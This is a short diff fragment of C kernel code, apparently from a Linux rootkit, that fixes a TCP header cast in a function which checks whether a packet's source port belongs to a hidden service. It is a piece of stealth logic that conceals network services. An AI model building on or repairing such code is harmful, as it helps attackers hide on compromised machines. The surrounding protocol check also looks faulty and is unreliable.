@@ -48,7 +48,7 @@ is_port_hidden (struct sk_buff *skb)
 		
 		/* check if this is an TCP packet */
 		if (ip_header->protocol == htons(6)) {
-			tcp_header = (struct tcp_header *) skb_transport_header(skb);
+			tcp_header = (struct tcphdr *) skb_transport_header(skb);
 			
 			/* check with the control API if this service is hidden */
 			if (is_service_hidden(tcp_header->source)
